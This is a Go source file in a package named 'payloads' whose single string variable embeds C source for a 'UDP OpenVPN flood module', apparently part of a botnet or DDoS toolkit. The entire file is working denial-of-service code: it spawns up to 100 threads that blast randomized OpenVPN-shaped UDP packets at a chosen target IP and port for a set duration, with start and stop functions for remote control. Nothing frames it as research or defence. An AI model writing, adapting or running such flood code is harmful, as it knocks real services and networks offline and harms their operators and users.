package payloads

var UDPOpenVPN = `
// ==================== UDP OPENVPN FLOOD MODULE ====================
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <arpa/inet.h>

static int openvpn_attack_running = 0;
static pthread_t openvpn_threads[100];

void rand_bytes_ovpn(unsigned char *buf, int len) {
    for (int i = 0; i < len; i++) buf[i] = rand() % 256;
}

void *openvpn_flood(void *arg) {
    char *target_ip = (char *)arg;
    int port = *(int *)((char *)arg + 64);
    int duration = *(int *)((char *)arg + 68);
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(port);
    sin.sin_addr.s_addr = inet_addr(target_ip);
    
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return NULL;
    
    struct sockaddr_in bind_addr = {0};
    bind_addr.sin_family = AF_INET;
    bind_addr.sin_port = htons(rand() & 0xFFFF);
    bind_addr.sin_addr.s_addr = 0;
    bind(fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr));
    
    connect(fd, (struct sockaddr *)&sin, sizeof(sin));
    
    unsigned char openvpn[] = {
        0x38, 0xc4, 0xfb, 0x98, 0x76, 0x1f, 0xfc, 0xfe, 0xf4, 0x00,
        0x00, 0x00, 0x01, 0x63, 0x31, 0x7b, 0x62, 0x36, 0x3e, 0xb1,
        0xa8, 0x93, 0xa8, 0x61, 0x98, 0x8b, 0x11, 0x2a, 0x3f, 0x7c,
        0x1e, 0xaa, 0xbf, 0xc0, 0x63, 0xad, 0xb7, 0x50, 0x68, 0xa0,
        0xd6, 0x2d, 0x0e, 0x17, 0x3d, 0xf8, 0xd4, 0xf4, 0x39, 0x69,
        0x8d, 0x69, 0x0d, 0x7d
    };
    
    time_t start = time(NULL);
    
    while (openvpn_attack_running && time(NULL) - start < duration) {
        rand_bytes_ovpn(openvpn + 1, 8);
        rand_bytes_ovpn(openvpn + 14, 40);
        send(fd, openvpn, sizeof(openvpn), MSG_NOSIGNAL);
    }
    
    close(fd);
    return NULL;
}

void start_openvpn_attack(char *target, int port, int threads, int duration_sec) {
    if (openvpn_attack_running) return;
    openvpn_attack_running = 1;
    
    char *arg = malloc(128);
    strcpy(arg, target);
    *((int *)(arg + 64)) = port;
    *((int *)(arg + 68)) = duration_sec;
    
    for (int i = 0; i < threads; i++) {
        pthread_create(&openvpn_threads[i], NULL, openvpn_flood, arg);
    }
    
    sleep(duration_sec);
    openvpn_attack_running = 0;
    for (int i = 0; i < threads; i++) {
        pthread_join(openvpn_threads[i], NULL);
    }
    free(arg);
}

void stop_openvpn_attack() { openvpn_attack_running = 0; }
// ==================== END OPENVPN MODULE ====================
`